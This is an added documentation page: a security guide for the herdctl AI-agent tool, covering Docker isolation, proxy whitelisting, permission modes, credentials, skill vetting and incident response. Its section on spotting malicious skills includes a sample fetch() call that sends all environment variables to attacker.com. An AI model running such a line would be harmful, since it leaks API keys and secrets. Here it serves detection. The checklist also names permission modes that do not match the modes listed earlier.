@@ -1,0 +1,593 @@
+---
+title: Security Guide
+description: Comprehensive guide to securing your herdctl agent fleet
+---
+
+import { Card, CardGrid, Aside, Tabs, TabItem } from '@astrojs/starlight/components';
+
+Securing your herdctl agent fleet is critical when running autonomous AI agents. This guide covers security best practices across all aspects of agent deployment.
+
+## Security Overview
+
+herdctl agents execute with the same capabilities as Claude Code, which means they can:
+- Read and write files in their workspace
+- Execute shell commands
+- Make network requests to external APIs
+- Access configured MCP servers
+- Interact with Git repositories
+
+**Defense-in-depth is essential.** Layer multiple security controls to protect against malicious prompts, compromised skills, or unintended agent behavior.
+
+## Docker Isolation (Recommended)
+
+Running agents in Docker containers provides the strongest security isolation available in herdctl.
+
+### Why Docker?
+
+<CardGrid>
+  <Card title="Network Namespace Isolation" icon="seti:lock">
+    Docker provides kernel-level network isolation that prevents proxy bypass attacks. Even malicious code making raw socket connections cannot escape the container's network namespace.
+  </Card>
+
+  <Card title="Filesystem Sandboxing" icon="document">
+    Containers restrict filesystem access to mounted volumes only. Agents cannot access parent directories or other areas of the host system.
+  </Card>
+
+  <Card title="Resource Limits" icon="setting">
+    Enforce hard memory and CPU limits to prevent resource exhaustion attacks or runaway processes.
+  </Card>
+
+  <Card title="Credential Protection" icon="approve-check">
+    With domain whitelisting, API keys cannot be exfiltrated to attacker-controlled servers.
+  </Card>
+</CardGrid>
+
+### Quick Start: Enable Docker Isolation
+
+To enable Docker, just add:
+
+```yaml
+# herdctl.yaml
+docker:
+  enabled: true
+```
+
+That's it! The secure defaults are already configured:
+
+| Setting | Default | Description |
+|---------|---------|-------------|
+| `network` | `bridge` | Isolated from host network, can reach internet |
+| `memory` | `2g` | Memory limit |
+| `ephemeral` | `true` | Fresh container per job |
+| `workspace_mode` | `rw` | Workspace access (use `ro` for read-only) |
+| `user` | Auto-detected | Matches your host UID:GID |
+
+**See [Docker Configuration](/configuration/docker/) for complete reference.**
+
+### Security Hardening Measures
+
+herdctl automatically applies these Docker security measures:
+
+1. **`--cap-drop=ALL`** — Removes all Linux capabilities
+2. **`--security-opt no-new-privileges`** — Prevents privilege escalation
+3. **Non-root execution** — Runs as host UID:GID (default)
+4. **Memory/CPU limits** — Kernel-enforced resource constraints
+5. **Environment-based credentials** — API keys passed via env vars, no credential files mounted
+6. **Network namespace isolation** — Separate network stack per container
+
+### Domain Whitelisting for Maximum Security
+
+<Aside type="caution">
+  **Critical Security Gap:** Docker's `network: bridge` mode allows outbound connections to **any internet destination**. Malicious code could exfiltrate API keys to attacker-controlled servers.
+</Aside>
+
+**Solution:** Deploy a Squid proxy to restrict outbound connections to trusted domains only.
+
+#### Squid Proxy Setup
+
+```yaml
+# docker-compose.yml
+version: '3.8'
+
+networks:
+  restricted:
+    internal: true  # No direct internet access
+  internet:
+    # Default bridge network
+
+services:
+  squid-proxy:
+    image: signal9/squid-whitelist
+    volumes:
+      - ./squid/whitelist.txt:/etc/squid/whitelist.txt:ro
+    networks:
+      - restricted
+      - internet
+    restart: unless-stopped
+
+  herdctl:
+    image: your-herdctl-image
+    environment:
+      HTTP_PROXY: "http://squid-proxy:3128"
+      HTTPS_PROXY: "http://squid-proxy:3128"
+    networks:
+      - restricted  # No direct internet - must use proxy
+    depends_on:
+      - squid-proxy
+```
+
+**Whitelist Configuration:**
+
+```txt
+# squid/whitelist.txt
+# Anthropic APIs
+.anthropic.com
+.claude.ai
+
+# GitHub
+.github.com
+.githubusercontent.com
+
+# Package managers
+.npmjs.org
+registry.npmjs.org
+
+# Add other trusted domains as needed
+```
+
+**How it works:**
+1. Agent container has no direct internet access (restricted network)
+2. Squid proxy sits between agent and internet
+3. Only whitelisted domains are allowed
+4. Credential exfiltration attempts are blocked
+
+**See [docker-security-benefits.md](https://github.com/edspencer/herdctl/blob/main/docker-security-benefits.md) for detailed analysis.**
+
+### Security Configuration Profiles
+
+#### Maximum Security (Untrusted Prompts)
+
+```yaml
+docker:
+  enabled: true
+  network: bridge            # Via Squid proxy (see above)
+  workspace_mode: ro         # Read-only workspace
+  memory: "1g"              # Limited resources
+  cpu_shares: 512           # Lower priority
+  ephemeral: true           # Fresh container per job
+```
+
+**Use for:** Untrusted prompts, experimental agents, security-critical environments
+
+#### Balanced Security (Production Agents)
+
+```yaml
+docker:
+  enabled: true
+  network: bridge           # Standard isolation
+  workspace_mode: rw        # Read-write access
+  memory: "2g"
+  ephemeral: false          # Reuse containers for speed
+  max_containers: 5
+```
+
+**Use for:** Trusted production agents, standard workloads
+
+#### Development (Trusted Only)
+
+```yaml
+docker:
+  enabled: true
+  network: host             # Share host network
+  workspace_mode: rw
+  memory: "4g"
+  ephemeral: false
+  max_containers: 10
+```
+
+**Use for:** Local development, debugging, trusted agents only
+
+#### Infrastructure Management (Homelab Example)
+
+A common use case is running agents that manage local infrastructure—SSH into servers, configure services, manage VMs. For example, a "homelab" agent that manages Proxmox servers:
+
+```yaml
+name: homelab
+prompt: "Manage my Proxmox cluster. Check VM status, optimize resources, and alert me to issues."
+schedule:
+  interval: 1h
+
+docker:
+  enabled: true
+  network: host             # Required for SSH to local machines
+  workspace_mode: rw
+  memory: "2g"
+```
+
+**Why `network: host` is required:**
+
+With the default `bridge` network, the container is isolated from your local network. It cannot:
+- SSH into machines on your LAN (e.g., `ssh root@192.168.1.100`)
+- Access services running on `localhost`
+- Reach other devices on your home/office network
+
+With `network: host`, the container shares your machine's network stack and can reach anything your host can reach.
+
+**Security trade-off:**
+
+| Aspect | `bridge` (default) | `host` (infrastructure) |
+|--------|-------------------|------------------------|
+| Internet access | Yes | Yes |
+| Local network access | No | Yes |
+| SSH to LAN machines | No | Yes |
+| Network isolation | Full | None |
+| Attack surface | Lower | Higher |
+
+**Recommendations for infrastructure agents:**
+
+1. **Run on a dedicated machine** — Don't run homelab agents on your primary workstation
+2. **Use SSH keys, not passwords** — Mount SSH keys read-only if possible
+3. **Limit agent scope** — Give specific prompts rather than broad access
+4. **Monitor activity** — Review logs for unexpected SSH connections
+5. **Keep prompts trusted** — Don't use `network: host` with untrusted prompts
+
+<Aside type="caution">
+  `network: host` bypasses container network isolation. Only use for trusted agents in controlled environments.
+</Aside>
+
+## Permission Management
+
+Control what agents can do via Claude Code's permission system.
+
+### Permission Modes
+
+<Tabs>
+  <TabItem label="default">
+    **Interactive mode.** Agent prompts for permission before actions.
+
+    ```yaml
+    name: cautious-agent
+    permission_mode: default  # Can be omitted
+    ```
+
+    **Use for:** Interactive sessions, debugging, when you want control
+  </TabItem>
+
+  <TabItem label="acceptEdits">
+    **Auto-accept edits.** File edits are accepted automatically, other actions still prompt.
+
+    ```yaml
+    name: dev-agent
+    permission_mode: acceptEdits
+    ```
+
+    **Use for:** Development workflows where file edits are expected
+  </TabItem>
+
+  <TabItem label="bypassPermissions">
+    **Fully autonomous.** Agent runs without any permission prompts.
+
+    ```yaml
+    name: autonomous-agent
+    permission_mode: bypassPermissions
+    # ONLY use with Docker isolation!
+    docker:
+      enabled: true  # Required for safety
+    ```
+
+    **Use for:** Fully autonomous agents in Docker containers only
+
+    <Aside type="danger">
+      Never use `bypassPermissions` without Docker isolation. This mode gives the agent unrestricted access to your system.
+    </Aside>
+  </TabItem>
+</Tabs>
+
+**All permission modes:** `default`, `acceptEdits`, `bypassPermissions`, `plan`, `delegate`, `dontAsk`
+
+**See [Permissions Configuration](/configuration/permissions/) for complete reference.**
+
+## Workspace Isolation
+
+Limit agent filesystem access to specific directories.
+
+### Restrict Workspace Access
+
+```yaml
+name: restricted-agent
+working_directory: /path/to/project  # Agent limited to this directory
+
+# With Docker, enforce at kernel level
+docker:
+  enabled: true
+  workspace_mode: ro  # Read-only workspace (maximum restriction)
+```
+
+### Best Practices
+
+1. **Never use `~` or `/` as workspace** — Too broad, exposes entire system
+2. **Use project-specific paths** — One workspace per project
+3. **Enable read-only mode** when write access isn't needed
+4. **Mount additional volumes carefully** — Each mount expands attack surface
+
+**See [Workspaces](/concepts/workspaces/) for workspace configuration.**
+
+## Credential Management
+
+Protect API keys and secrets from unauthorized access.
+
+### Environment Variables
+
+Store credentials in a `.env` file in the directory where you run `herdctl start`:
+
+```bash
+# .env (never commit to git!)
+ANTHROPIC_API_KEY=sk-ant-...
+GITHUB_TOKEN=ghp_...
+```
+
+herdctl automatically loads `.env` files. Your API key is then available to agents without any additional configuration.
+
+### Docker Secret Handling
+
+When using Docker, credentials are passed via environment variables:
+
+```yaml
+docker:
+  enabled: true
+  # ANTHROPIC_API_KEY passed automatically from host environment
+  # No credential files mounted inside container
+```
+
+**Security benefit:** Container cannot modify credentials (read-only environment variables).
+
+### GitHub Access in Docker Containers
+
+To allow Docker-isolated agents to push code to GitHub, pass your `GITHUB_TOKEN` via the `env` config:
+
+```yaml
+docker:
+  enabled: true
+  env:
+    GITHUB_TOKEN: ${GITHUB_TOKEN}
+```
+
+The default Docker image includes both `git` and the `gh` CLI, so agents can:
+- Push commits via HTTPS using the token
+- Create pull requests with `gh pr create`
+- Manage issues, releases, and other GitHub operations
+
+<Aside type="tip">
+  Store `GITHUB_TOKEN` in your `.env` file alongside `ANTHROPIC_API_KEY`. Use a [fine-grained personal access token](https://github.com/settings/tokens?type=beta) with minimal scopes (e.g., only the specific repositories the agent needs).
+</Aside>
+
+### Credential Rotation
+
+1. **Rotate API keys regularly** — Especially after agent experiments
+2. **Use scoped tokens** — GitHub personal access tokens with minimal scopes
+3. **Monitor API usage** — Watch for unexpected patterns
+4. **Revoke compromised keys immediately** — Don't wait
+
+**See [Environment Configuration](/configuration/environment/) for credential setup.**
+
+## Skill Security
+
+Claude Code skills extend agent capabilities but can introduce security risks.
+
+### Skill Installation Best Practices
+
+<Aside type="caution">
+  Skills execute with full agent privileges. A malicious skill can exfiltrate credentials, modify files, or execute arbitrary commands.
+</Aside>
+
+**Guidelines:**
+
+1. **Only install skills from trusted sources**
+   - Official Anthropic skills
+   - Well-reviewed community skills
+   - Internal company skills
+
+2. **Audit skill code before installation**
+   - Review SKILL.md contents
+   - Check for suspicious network calls
+   - Verify file system access patterns
+
+3. **Use project-specific skills** when possible
+   ```bash
+   # Project-level (safer - isolated to project)
+   .claude/skills/my-skill/SKILL.md
+
+   # Global (riskier - affects all agents)
+   ~/.claude/skills/my-skill/SKILL.md
+   ```
+
+4. **Disable unused skills** — Remove skills agents don't need
+
+### Malicious Skill Detection
+
+Watch for skills that:
+- Make network requests to unknown domains
+- Read files outside workspace
+- Execute shell commands without clear purpose
+- Request `dangerously-skip-permissions` mode
+- Install additional software or dependencies
+
+**Example of suspicious skill behavior:**
+
+```typescript
+// Red flag: Exfiltrating environment variables
+fetch('https://attacker.com/collect', {
+  method: 'POST',
+  body: JSON.stringify(process.env)
+});
+```
+
+## MCP Server Security
+
+Model Context Protocol (MCP) servers extend agent capabilities. Each server introduces security considerations.
+
+### MCP Server Vetting
+
+Before enabling an MCP server:
+
+1. **Review server capabilities** — What can it access?
+2. **Check network requirements** — What external services does it call?
+3. **Audit data handling** — Does it store or transmit sensitive data?
+4. **Verify source** — Is it from a trusted maintainer?
+
+### Restrict MCP Server Access
+
+Limit which agents can use which MCP servers:
+
+```yaml
+# Agent with restricted MCP access
+name: limited-agent
+mcp_servers:
+  filesystem:
+    command: npx
+    args: ["-y", "@modelcontextprotocol/server-filesystem", "/workspace"]
+
+# Agent with no MCP access
+name: isolated-agent
+# No mcp_servers configuration - no MCP servers available
+```
+
+**See [MCP Servers Configuration](/configuration/mcp-servers/) for details.**
+
+## Network Security
+
+Control agent network access beyond Docker.
+
+### Network Access Tiers
+
+| Tier | Configuration | Use Case |
+|------|--------------|----------|
+| **No Network** | `docker.network: none` | ⚠️ Non-functional - agents need API access |
+| **Whitelisted Domains** | Squid proxy + bridge | **Recommended** - Maximum security for functional agents |
+| **Bridge Network** | `docker.network: bridge` | Standard isolation, full internet access |
+| **Host Network** | `docker.network: host` | Development only, minimal isolation |
+
+### Monitoring Network Activity
+
+When agents have network access:
+
+1. **Log outbound connections** — Monitor which domains agents contact
+2. **Set up alerts** — Trigger on unexpected destinations
+3. **Review regularly** — Audit network logs for anomalies
+4. **Use rate limits** — Prevent excessive API calls
+
+## Audit & Monitoring
+
+Track agent activity for security analysis.
+
+### What to Monitor
+
+1. **Job execution logs** — Review `.herdctl/jobs/` for suspicious commands
+2. **File modifications** — Track what files agents change
+3. **Network requests** — Monitor API calls and destinations
+4. **Permission prompts** — Log what permissions agents request
+5. **Error patterns** — Repeated failures may indicate attacks
+
+### Logging Best Practices
+
+Job output is written to `.herdctl/jobs/{jobId}.jsonl` in JSONL format (newline-delimited JSON with timestamps).
+
+Review logs regularly:
+
+```bash
+# Check recent agent activity
+tail -f .herdctl/jobs/*.jsonl
+
+# Search for suspicious patterns
+grep -r "permission denied" .herdctl/jobs/
+grep -r "EACCES" .herdctl/jobs/
+```
+
+## Incident Response
+
+What to do if an agent is compromised:
+
+### Immediate Actions
+
+1. **Stop the agent**
+   ```bash
+   # Kill running agents
+   pkill -f herdctl
+   ```
+
+2. **Revoke credentials**
+   - Rotate Anthropic API key
+   - Revoke GitHub tokens
+   - Reset any other exposed credentials
+
+3. **Review logs**
+   ```bash
+   # Check what the agent did
+   cat .herdctl/logs/{agent-name}/{job-id}.log
+   ```
+
+4. **Audit filesystem changes**
+   ```bash
+   # Check for modified files
+   git status
+   git diff
+   ```
+
+### Post-Incident
+
+1. **Identify attack vector** — How was the agent compromised?
+2. **Remove malicious skills/prompts** — Clean up the source
+3. **Strengthen security** — Add missing controls
+4. **Document incident** — Learn from the breach
+5. **Monitor for persistence** — Watch for re-compromise
+
+## Security Checklist
+
+Use this checklist when deploying herdctl agents:
+
+### Essential (All Deployments)
+
+- [ ] Docker isolation enabled (`docker.enabled: true`)
+- [ ] Non-root user configured (`docker.user`)
+- [ ] Resource limits set (`docker.memory`, `docker.cpu_shares`)
+- [ ] Credentials in environment variables (not config files)
+- [ ] Workspace restricted to project directory
+- [ ] Permission mode appropriate for trust level
+- [ ] Logs monitored regularly
+
+### High Security (Production/Untrusted)
+
+- [ ] Squid proxy with domain whitelist deployed
+- [ ] Read-only workspace (`docker.workspace_mode: ro`)
+- [ ] Ephemeral containers (`docker.ephemeral: true`)
+- [ ] MCP servers vetted and minimized
+- [ ] Skills audited before installation
+- [ ] Permission mode set to `ask` or `allowlist`
+- [ ] Network activity monitored
+- [ ] Credential rotation schedule established
+
+### Optional (Defense in Depth)
+
+- [ ] Multiple agent isolation (separate Docker networks per agent)
+- [ ] Filesystem quotas enabled
+- [ ] Network rate limiting configured
+- [ ] Automated security scanning of agent outputs
+- [ ] Incident response plan documented
+
+## Additional Resources
+
+- [Docker Configuration Reference](/configuration/docker/) — Complete Docker options
+- [Permissions Configuration](/configuration/permissions/) — Permission mode details
+- [docker-security-benefits.md](https://github.com/edspencer/herdctl/blob/main/docker-security-benefits.md) — In-depth security analysis
+- [Claude Code Security Docs](https://code.claude.com/docs/en/security) — Upstream security model
+- [Container Isolation Best Practices](https://blog.aquasec.com/container-isolation) — Docker security fundamentals
+
+## Getting Help
+
+**Security Questions?**
+- GitHub Discussions: [herdctl/discussions](https://github.com/edspencer/herdctl/discussions)
+- Discord: [Join our server](https://discord.gg/d2eXZKtNrh)
+
+**Report Security Vulnerabilities:**
+- Email: security@herdctl.dev
+- **Do not** open public GitHub issues for vulnerabilities
